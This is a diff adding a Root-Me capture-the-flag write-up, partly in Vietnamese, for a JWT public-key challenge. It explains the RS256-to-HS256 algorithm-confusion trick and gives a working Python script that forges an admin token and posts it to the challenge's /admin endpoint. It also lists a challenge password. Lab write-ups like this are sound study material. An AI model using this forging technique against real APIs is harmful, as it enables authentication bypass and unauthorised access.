@@ -35,6 +35,9 @@
 - [SQL injection - Blind](#sql-injection---blind)
   - [Solution 1](#solution-1)
   - [Solution 2: sqlmap](#solution-2-sqlmap)
+- [JSON Web Token (JWT) - Public key](#json-web-token-jwt---public-key)
+  - [Description](#description-3)
+  - [Solution](#solution-4)
 
 # HTML - Source code
 pass: nZ^&@q5&sjJHev0
@@ -518,3 +521,47 @@ yay, đã có đủ hết mọi dữ kiện cần thiết, giờ thì dump hết
 ```
 
 ![img](./img/8.png)
+
+# JSON Web Token (JWT) - Public key
+## Description
+You find an API with 3 endpoints:
+
+1. /key (accessible with GET)
+2. /auth (accessible with POST)
+3. /admin (accessible with POST)
+
+There is sure to be important data in the admin section, access it!
+
+## Solution
+như description: 
+1. ``/key`` cho mình public key
+2. ``/auth`` cho mình 1 jwt với thuật toán ``RS256``
+
+![img](./img/9.png)
+
+3. vì đã biết public key --> chuyển mã hóa từ RS256 sang HS256
+
+note:
+```
+Nếu chuyển từ RS256 sang HS256 thì signature sẽ được verify bằng public key của HS256. khi đã thay đổi thuật toán mã hoá sang HS256, vì lúc này secret key tương đương với public key mà mình có được, chỉ cần sign signature bằng key mà mình có được, ứng dụng hệ thống sẽ verify trên public key nên sẽ có thể dễ dàng bypass được JWT verification.
+```
+
+script (use [pyjwt](https://github.com/jpadilla/pyjwt)):
+```
+#!python3
+import requests
+import jwt
+
+s=requests.session()
+url='http://challenge01.root-me.org/web-serveur/ch60/'
+key=s.get(url+'key').json()
+key="\n".join(key)+"\n"
+
+token=jwt.encode({"username":"admin"}, key=key,algorithm='HS256')
+
+r2=s.post(url+'admin', headers={'Authorization': 'Bearer ' + token.decode()}) 
+print(r2.text)
+```
+
+![img](./img/10.png)
+
